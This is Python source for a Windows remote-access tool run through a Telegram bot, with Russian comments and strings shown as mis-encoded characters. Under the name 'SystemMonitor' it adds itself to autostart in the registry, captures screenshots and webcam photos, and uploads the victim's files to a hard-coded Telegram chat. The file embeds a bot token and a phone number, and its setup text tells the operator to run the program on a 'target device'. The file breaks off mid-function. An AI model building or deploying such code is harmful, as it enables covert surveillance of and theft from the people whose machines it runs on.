import os
import platform
import psutil
import time
import requests
import sys
import winreg
import socket
from datetime import datetime
import json
import threading
import pyautogui
import tempfile
import cv2
from pathlib import Path

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è Telegram
TELEGRAM_BOT_TOKEN = '8200230299:AAEB-Tbaq5BCgUolnCe_S_qH3JyTRvtPll8'
TELEGRAM_CHAT_ID = '5298777521'
SECOND_ACCOUNT_PHONE = '89152898250'

# –ü—É—Ç—å –¥–ª—è –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏
AUTOSTART_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
APP_NAME = "SystemMonitor"
SCRIPT_PATH = os.path.abspath(sys.argv[0])

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
start_time = datetime.now()
last_update_id = 0
monitoring_active = True
current_directory = os.path.expanduser("~")  # –ù–∞—á–∏–Ω–∞–µ–º —Å –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
pending_messages = {}  # –î–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è ID —Å–æ–æ–±—â–µ–Ω–∏–π

def get_system_info():
    """–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–∏—Å—Ç–µ–º–µ"""
    info = {
        "OS": platform.system(),
        "OS Version": platform.version(),
        "OS Release": platform.release(),
        "Architecture": platform.machine(),
        "Processor": platform.processor(),
        "RAM": f"{round(psutil.virtual_memory().total / (1024**3), 2)} GB",
        "CPU Cores": psutil.cpu_count(logical=False),
        "Logical CPUs": psutil.cpu_count(logical=True),
    }
    return info

def get_ip_address():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ IP-–∞–¥—Ä–µ—Å–∞"""
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except Exception as e:
        print(f"Error getting IP: {e}")
        return "Unknown"

def get_uptime():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏ —Ä–∞–±–æ—Ç—ã –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞"""
    uptime = datetime.now() - start_time
    hours, remainder = divmod(int(uptime.total_seconds()), 3600)
    minutes, seconds = divmod(remainder, 60)
    return f"{hours}h {minutes}m {seconds}s"

def send_telegram_message(text, reply_markup=None, message_id=None):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∏–ª–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram"""
    if message_id:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'message_id': message_id,
            'text': text,
            'parse_mode': 'HTML',
            'reply_markup': json.dumps(reply_markup) if reply_markup else None
        }
    else:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': text,
            'parse_mode': 'HTML',
            'reply_markup': json.dumps(reply_markup) if reply_markup else None
        }
    
    try:
        response = requests.post(url, data=payload, timeout=10)
        if response.json().get('ok'):
            return response.json()['result']['message_id']
        print(f"Telegram API error: {response.json()}")
    except Exception as e:
        print(f"Error sending message: {e}")
    return None

def send_telegram_photo(photo_path, caption=None):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ –≤ Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
    with open(photo_path, 'rb') as photo:
        files = {'photo': photo}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        if caption:
            data['caption'] = caption
        try:
            response = requests.post(url, files=files, data=data)
            return response.json()
        except Exception as e:
            print(f"Error sending photo: {e}")
            return None

def send_telegram_document(document_path, caption=None):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞ –≤ Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(document_path, 'rb') as doc:
        files = {'document': doc}
        data = {'chat_id': TELEGRAM_CHAT_ID}
        if caption:
            data['caption'] = caption
        try:
            response = requests.post(url, files=files, data=data)
            return response.json()
        except Exception as e:
            print(f"Error sending document: {e}")
            return None

def take_screenshot(callback_message_id):
    """–°–æ–∑–¥–∞–Ω–∏–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞ —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ–º –æ –ø—Ä–æ—Ü–µ—Å—Å–µ"""
    try:
        processing_msg_id = send_telegram_message("‚è≥ –î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç...")
        
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
            screenshot_path = tmp.name
        
        pyautogui.screenshot(screenshot_path)
        
        if processing_msg_id:
            delete_telegram_message(processing_msg_id)
        
        send_telegram_photo(
            screenshot_path, 
            caption="üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç –≥–æ—Ç–æ–≤"
        )
        
        os.unlink(screenshot_path)
        return True
    except Exception as e:
        print(f"Error taking screenshot: {e}")
        if processing_msg_id:
            send_telegram_message(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: {str(e)}")
        return False

def take_webcam_photo(callback_message_id):
    """–°–æ–∑–¥–∞–Ω–∏–µ —Ñ–æ—Ç–æ —Å –≤–µ–±-–∫–∞–º–µ—Ä—ã —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ–º –æ –ø—Ä–æ—Ü–µ—Å—Å–µ"""
    try:
        processing_msg_id = send_telegram_message("‚è≥ –î–µ–ª–∞—é —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã...")
        
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            if processing_msg_id:
                delete_telegram_message(processing_msg_id)
            send_telegram_message("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ")
            return False
        
        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
            photo_path = tmp.name
        
        cv2.imwrite(photo_path, frame)
        
        if processing_msg_id:
            delete_telegram_message(processing_msg_id)
        
        send_telegram_photo(
            photo_path, 
            caption="üì∑ –§–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –≥–æ—Ç–æ–≤–æ"
        )
        
        os.unlink(photo_path)
        return True
    except Exception as e:
        print(f"Error taking webcam photo: {e}")
        if processing_msg_id:
            send_telegram_message(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ñ–æ—Ç–æ: {str(e)}")
        return False

def delete_telegram_message(message_id):
    """–£–¥–∞–ª–µ–Ω–∏–µ —Å–æ–æ–±—â–µ–Ω–∏—è –≤ Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/deleteMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'message_id': message_id
    }
    try:
        requests.post(url, data=payload, timeout=5)
    except Exception as e:
        print(f"Error deleting message: {e}")

# ================== –§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä ==================

def sanitize_filename(name):
    """–û—á–∏—Å—Ç–∫–∞ –∏–º–µ–Ω–∏ —Ñ–∞–π–ª–∞ –¥–ª—è callback_data"""
    # –ó–∞–º–µ–Ω—è–µ–º –Ω–µ–¥–æ–ø—É—Å—Ç–∏–º—ã–µ —Å–∏–º–≤–æ–ª—ã, –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
    cleaned = ''.join(c if c.isalnum() or c in ' _-.' else '_' for c in name)
    return cleaned[:32]  # Telegram –∏–º–µ–µ—Ç –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –Ω–∞ –¥–ª–∏–Ω—É callback_data

def list_directory(path=None):
    """–ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ —Ñ–∞–π–ª–æ–≤ –∏ –ø–∞–ø–æ–∫"""
    global current_directory
    
    if path:
        if path == "..":
            # –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ
            new_path = Path(current_directory).parent
            if str(new_path) >= str(Path.home()):  # –ù–µ –≤—ã—Ö–æ–¥–∏–º –≤—ã—à–µ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
                current_directory = str(new_path)
        elif os.path.isabs(path):
            # –ê–±—Å–æ–ª—é—Ç–Ω—ã–π –ø—É—Ç—å
            if path.startswith(str(Path.home())):  # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –æ—Å—Ç–∞–µ–º—Å—è –≤ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
                current_directory = path
        else:
            # –û—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω—ã–π –ø—É—Ç—å
            new_path = os.path.join(current_directory, path)
            if os.path.exists(new_path) and new_path.startswith(str(Path.home())):
                current_directory = new_path
    
    try:
        items = os.listdir(current_directory)
        dirs = [d for d in items if os.path.isdir(os.path.join(current_directory, d))]
        files = [f for f in items if os.path.isfile(os.path.join(current_directory, f))]
        return dirs, files, None
    except Exception as e:
        return None, None, f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞: {str(e)}"

def create_file_manager_keyboard(dirs, files):
    """–°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –¥–ª—è —Ñ–∞–π–ª–æ–≤–æ–≥–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∞"""
    keyboard = []
    
    # –î–æ–±–∞–≤–ª—è–µ–º –±—ã—Å—Ç—Ä—ã–µ –ø–∞–ø–∫–∏ (–ø–µ—Ä–≤—ã–µ 3 –≤ —Ä—è–¥)
    special_folders = get_special_folders()
    if special_folders:
        quick_access = []
        for name, path in special_folders.items():
            if os.path.exists(path):
                quick_access.append({
                    "text": f"üöÄ {name}",
                    "callback_data": f"fm:quick:{sanitize_filename(path)}"
                })
        
        # –†–∞–∑–±–∏–≤–∞–µ–º –Ω–∞ —Ä—è–¥—ã –ø–æ 3 –∫–Ω–æ–ø–∫–∏
        for i in range(0, len(quick_access), 3):
            keyboard.append(quick_access[i:i+3])
    
    # –ö–Ω–æ–ø–∫–∞ –¥–ª—è –ø–µ—Ä–µ—Ö–æ–¥–∞ –Ω–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ
    if current_directory != str(Path.home()):
        keyboard.append([{"text": "üìÇ –ù–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ", "callback_data": "fm:up"}])
    
    # –ö–Ω–æ–ø–∫–∏ –¥–ª—è –ø–∞–ø–æ–∫ –≤ —Ç–µ–∫—É—â–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
    for d in sorted(dirs)[:15]:  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ
        safe_name = sanitize_filename(d)
        keyboard.append([{"text": f"üìÅ {d}", "callback_data": f"fm:dir:{safe_name}"}])
    
    # –ö–Ω–æ–ø–∫–∏ –¥–ª—è —Ñ–∞–π–ª–æ–≤
    for f in sorted(files)[:15]:
        size = os.path.getsize(os.path.join(current_directory, f))
        size_str = f"{size/1024:.1f} KB" if size < 1024*1024 else f"{size/(1024*1024):.1f} MB"
        safe_name = sanitize_filename(f)
        keyboard.append([{"text": f"üìÑ {f} ({size_str})", "callback_data": f"fm:file:{safe_name}"}])
    
    # –ö–Ω–æ–ø–∫–∞ –≤–æ–∑–≤—Ä–∞—Ç–∞ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
    keyboard.append([{"text": "üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", "callback_data": "main_menu"}])
    
    return {"inline_keyboard": keyboard}

def send_file_manager(message_id=None):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ –∏–ª–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Ñ–∞–π–ª–æ–≤–æ–≥–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∞"""
    dirs, files, error = list_directory()
    
    if error:
        text = error
        keyboard = None
    else:
        text = f"üìÇ –¢–µ–∫—É—â–∞—è –ø–∞–ø–∫–∞:\n<code>{current_directory}</code>\n\n"
        text += f"üìÅ –ü–∞–ø–æ–∫: {len(dirs)}\n"
        text += f"üìÑ –§–∞–π–ª–æ–≤: {len(files)}\n\n"
        text += "üöÄ <b>–ë—ã—Å—Ç—Ä—ã–µ –ø–∞–ø–∫–∏:</b> –î–æ–∫—É–º–µ–Ω—Ç—ã, –ó–∞–≥—Ä—É–∑–∫–∏, –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª"
        keyboard = create_file_manager_keyboard(dirs, files)
    
    if message_id:
        send_telegram_message(text, reply_markup=keyboard, message_id=message_id)
    else:
        send_telegram_message(text, reply_markup=keyboard)

def download_file(file_name):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é"""
    file_path = os.path.join(current_directory, file_name)
    
    if not os.path.exists(file_path):
        send_telegram_message(f"‚ö†Ô∏è –§–∞–π–ª {file_name} –Ω–µ –Ω–∞–π–¥–µ–Ω")
        return
    
    file_size = os.path.getsize(file_path)
    if file_size > 50 * 1024 * 1024:  # 50MB –ª–∏–º–∏—Ç Telegram
        send_telegram_message(f"‚ö†Ô∏è –§–∞–π–ª —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π ({file_size/(1024*1024):.1f} MB). –ú–∞–∫—Å–∏–º—É–º 50MB.")
        return
    
    try:
        send_telegram_message(f"‚è≥ –û—Ç–ø—Ä–∞–≤–ª—è—é —Ñ–∞–π–ª: {file_name} ({file_size/1024:.1f} KB)...")
        send_telegram_document(file_path, caption=f"üìÑ {file_name}")
    except Exception as e:
        send_telegram_message(f"‚ö†Ô∏è –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Ñ–∞–π–ª–∞: {str(e)}")

def handle_fm_callback(data_parts, message_id):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ callback –æ—Ç —Ñ–∞–π–ª–æ–≤–æ–≥–æ –º–µ–Ω–µ–¥–∂–µ—Ä–∞"""
    global current_directory
    
    if data_parts[1] == 'up':
        # –ü–µ—Ä–µ—Ö–æ–¥ –Ω–∞ —É—Ä–æ–≤–µ–Ω—å –≤—ã—à–µ
        new_path = Path(current_directory).parent
        if str(new_path) >= str(Path.home()):
            current_directory = str(new_path)
        send_file_manager(message_id)
    
    elif data_parts[1] == 'quick':
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –±—ã—Å—Ç—Ä—ã—Ö –ø–∞–ø–æ–∫
        path = ':'.join(data_parts[2:])
        if os.path.exists(path):
            current_directory = path
            send_file_manager(message_id)
        else:
            send_telegram_message(f"–ü–∞–ø–∫–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞: {path}")
    
    elif data_parts[1] == 'dir':
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ –æ–±—ã—á–Ω—ã—Ö –ø–∞–ø–æ–∫
        safe_name = ':'.join(data_parts[2:])
        dirs, _, _ = list_directory()
        if dirs:
            for d in dirs:
                if sanitize_filename(d) == safe_name:
                    list_directory(d)
                    send_file_manager(message_id)
                    break
    
    elif data_parts[1] == 'file':
        # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ñ–∞–π–ª–æ–≤
        safe_name = ':'.join(data_parts[2:])
        _, files, _ = list_directory()
        if files:
            for f in files:
                if sanitize_filename(f) == safe_name:
                    download_file(f)
                    break

def get_special_folders():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –ø—É—Ç–µ–π –∫ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–º –ø–∞–ø–∫–∞–º Windows"""
    try:
        import ctypes
        from ctypes import windll, create_unicode_buffer
        
        # –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã –¥–ª—è —Å–ø–µ—Ü–∏–∞–ª—å–Ω—ã—Ö –ø–∞–ø–æ–∫ Windows
        CSIDL_DESKTOP = 0x0000        # –†–∞–±–æ—á–∏–π —Å—Ç–æ–ª
        CSIDL_PERSONAL = 0x0005       # –î–æ–∫—É–º–µ–Ω—Ç—ã
        CSIDL_DOWNLOADS = 0x002c      # –ó–∞–≥—Ä—É–∑–∫–∏
        
        SHGFP_TYPE_CURRENT = 0   # –ü–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—É—â–∏–π –ø—É—Ç—å (–Ω–µ —É–º–æ–ª—á–∞—Ç–µ–ª—å–Ω—ã–π)
        
        # –°–æ–∑–¥–∞–µ–º –±—É—Ñ–µ—Ä –¥–ª—è –ø—É—Ç–∏
        buf = create_unicode_buffer(ctypes.wintypes.MAX_PATH)
        
        folders = {}
        
        # –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø—É—Ç–∏
        def get_folder_path(csidl):
            if windll.shell32.SHGetFolderPathW(None, csidl, None, SHGFP_TYPE_CURRENT, buf) == 0:
                return buf.value
            return None
        
        # –ü–æ–ª—É—á–∞–µ–º –ø—É—Ç–∏
        if path := get_folder_path(CSIDL_DESKTOP):
            folders["–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª"] = path
        if path := get_folder_path(CSIDL_PERSONAL):
            folders["–î–æ–∫—É–º–µ–Ω—Ç—ã"] = path
        if path := get_folder_path(CSIDL_DOWNLOADS):
            folders["–ó–∞–≥—Ä—É–∑–∫–∏"] = path
            
        return folders
    
    except Exception as e:
        print(f"Error getting special folders: {e}")
        # –í–æ–∑–≤—Ä–∞—â–∞–µ–º —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –ø—É—Ç–∏ –∫–∞–∫ fallback
        return {
            "–†–∞–±–æ—á–∏–π —Å—Ç–æ–ª": os.path.join(os.path.expanduser("~"), "Desktop"),
            "–î–æ–∫—É–º–µ–Ω—Ç—ã": os.path.join(os.path.expanduser("~"), "Documents"),
            "–ó–∞–≥—Ä—É–∑–∫–∏": os.path.join(os.path.expanduser("~"), "Downloads")
        }

# ================== –û—Å–Ω–æ–≤–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ ==================
def send_status():
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ —Å–∏—Å—Ç–µ–º—ã"""
    system_info = get_system_info()
    status_message = (
        f"<b>üìä –°—Ç–∞—Ç—É—Å —Å–∏—Å—Ç–µ–º—ã</b>\n\n"
        f"<b>üñ• –û–°:</b> {system_info['OS']} {system_info['OS Version']}\n"
        f"<b>üîå IP-–∞–¥—Ä–µ—Å:</b> <code>{get_ip_address()}</code>\n"
        f"<b>‚è≥ –í—Ä–µ–º—è —Ä–∞–±–æ—Ç—ã:</b> {get_uptime()}\n"
        f"<b>üíæ –û–ó–£:</b> {system_info['RAM']}\n"
        f"<b>‚öôÔ∏è –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä:</b> {system_info['Processor']} ({system_info['CPU Cores']} —è–¥–µ—Ä)"
    )
    send_telegram_message(status_message)

def create_main_keyboard():
    """–°–æ–∑–¥–∞–Ω–∏–µ –æ—Å–Ω–æ–≤–Ω–æ–π –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã"""
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "üîÑ –°—Ç–∞—Ç—É—Å", "callback_data": "show_status"},
                {"text": "üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç", "callback_data": "take_screenshot"}
            ],
            [
                {"text": "üì∑ –ö–∞–º–µ—Ä–∞", "callback_data": "take_webcam_photo"},
                {"text": "üìÅ –§–∞–π–ª—ã", "callback_data": "show_files"}
            ],
            [
                {"text": "üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å", "callback_data": "stop_monitoring"}
            ]
        ]
    }
    return keyboard

def stop_monitoring():
    """–û—Å—Ç–∞–Ω–æ–≤–∫–∞ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞"""
    global monitoring_active
    monitoring_active = False
    remove_from_autostart()
    send_telegram_message("‚úÖ <b>–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω</b>\n\n–ü—Ä–æ–≥—Ä–∞–º–º–∞ —É–¥–∞–ª–µ–Ω–∞ –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏.")
    os._exit(0)

def send_welcome_message():
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ–º"""
    welcome_text = (
        "‚ö†Ô∏è <b>–í–ù–ò–ú–ê–ù–ò–ï: –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å</b> ‚ö†Ô∏è\n\n"
        "–ß–µ—Ä–µ–∑ —ç—Ç–æ–≥–æ –±–æ—Ç–∞ –≤—ã —Å–º–æ–∂–µ—Ç–µ —É–¥–∞–ª–µ–Ω–Ω–æ –º–æ–Ω–∏—Ç–æ—Ä–∏—Ç—å –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ.\n\n"
        "<b>–î–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞:</b>\n"
        "1. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É –Ω–∞ —Ü–µ–ª–µ–≤–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ\n"
        "2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É –æ—Ç –∏–º–µ–Ω–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞\n"
        "3. –î–æ–∂–¥–∏—Ç–µ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è\n\n"
        "<b>–¢–µ—Ö–ø–æ–¥–¥–µ—Ä–∂–∫–∞:</b> @crreativve\n"
        "<b>–¢—Ä–µ–±–æ–≤–∞–Ω–∏—è:</b> –°—Ç–∞–±–∏–ª—å–Ω—ã–π –∏–Ω—Ç–µ—Ä–Ω–µ—Ç –Ω–∞ –æ–±–æ–∏—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö\n\n"
        "‚ùó –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ –Ω–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö, –≥–¥–µ —É –≤–∞—Å –µ—Å—Ç—å –ø—Ä–∞–≤–æ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞"
    )
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "‚úÖ –Ø –ø–æ–Ω–∏–º–∞—é –∏ –ø—Ä–∏–Ω–∏–º–∞—é —É—Å–ª–æ–≤–∏—è", "callback_data": "accept_terms"}],
            [{"text": "‚ùå –û—Ç–º–µ–Ω–∏—Ç—å", "callback_data": "cancel_setup"}]
        ]
    }
    
    send_telegram_message(welcome_text, reply_markup=keyboard)

def handle_updates():
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π —Å –¥–æ–±–∞–≤–ª–µ–Ω–Ω—ã–º —É—Å–ª–æ–≤–∏–µ–º"""
    global last_update_id
    
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    params = {'offset': last_update_id + 1, 'timeout': 5}
    
    try:
        response = requests.get(url, params=params)
        data = response.json()
        
        if data.get('ok'):
            for update in data.get('result', []):
                last_update_id = update['update_id']
                
                # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Å—Ç–∞—Ä—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è
                if 'message' in update and 'text' in update['message']:
                    if update['message']['text'].lower() == '/start':
                        send_welcome_message()
                        continue
                        
                if 'callback_query' in update:
                    # –û–±—Ä–∞–±–æ—Ç–∫–∞ –ø—Ä–∏–Ω—è—Ç–∏—è —É—Å–ª–æ–≤–∏–π
                    if update['callback_query']['data'] == 'accept_terms':
                        send_telegram_message(
                            "üõ†Ô∏è <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è</b>\n\n"
                            "1. –°–∫–∞—á–∞–π—Ç–µ –ø—Ä–æ–≥—Ä–∞–º–º—É –ø–æ —Å—Å—ã–ª–∫–µ: [—Å—Å—ã–ª–∫–∞_–Ω–∞_–ø—Ä–æ–≥—Ä–∞–º–º—É]\n"
                            "2. –ó–∞–ø—É—Å—Ç–∏—Ç–µ EXE-—Ñ–∞–π–ª –Ω–∞ —Ü–µ–ª–µ–≤–æ–º —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ\n"
                            "3. –î–æ–∂–¥–∏—Ç–µ—Å—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è\n\n"
                            "<i>–ü—Ä–æ–≥—Ä–∞–º–º–∞ —Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏</i>"
                        )
                        continue
                        
                    elif update['callback_query']['data'] == 'cancel_setup':
                        send_telegram_message("‚ùå –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –æ—Ç–º–µ–Ω–µ–Ω–∞")
                        continue
                    
                    elif update['callback_query']['data'] == 'show_status':
                        send_status()
                    elif update['callback_query']['data'] == 'take_screenshot':
                        threading.Thread(target=take_screenshot, args=(message_id,)).start()
                    elif update['callback_query']['data'] == 'take_webcam_photo':
                        threading.Thread(target=take_webcam_photo, args=(message_id,)).start()
                    elif update['callback_query']['data'] == 'show_files':
                        current_directory = os.path.expanduser("~")  # –°–±—Ä–æ—Å –∫ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
                        send_file_manager()
                    elif update['callback_query']['data'] == 'main_menu':
                        send_telegram_message("–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é:", reply_markup=create_main_keyboard(), message_id=message_id)
                    elif update['callback_query']['data'] == 'stop_monitoring':
                        stop_monitoring()
                
                elif 'message' in update and 'text' in update['message']:
                    text = update['message']['text'].lower()
                    message_id = update['message']['message_id']
                    
                    if text == '/status':
                        send_status()
                    elif text == '/screenshot':
                        threading.Thread(target=take_screenshot, args=(message_id,)).start()
                    elif text == '/photo':
                        threading.Thread(target=take_webcam_photo, args=(message_id,)).start()
                    elif text == '/files':
                        current_directory = os.path.expanduser("~")  # –°–±—Ä–æ—Å –∫ –¥–æ–º–∞—à–Ω–µ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏
                        send_file_manager()
                    elif text == '/stop':
                        stop_monitoring()
    
    except Exception as e:
        print(f"Error handling updates: {e}")

def add_to_autostart():
    """–î–æ–±–∞–≤–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –≤ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫—É"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, SCRIPT_PATH)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error adding to autostart: {e}")
        return False

def remove_from_autostart():
    """–£–¥–∞–ª–µ–Ω–∏–µ –ø—Ä–æ–≥—Ä–∞–º–º—ã –∏–∑ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏"""
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, AUTOSTART_KEY, 0, winreg.KEY_WRITE)
        winreg.DeleteValue(key, APP_NAME)
        winreg.CloseKey(key)
        return True
    except Exception as e:
        print(f"Error removing from autostart: {e}")
        return False

def is_admin():
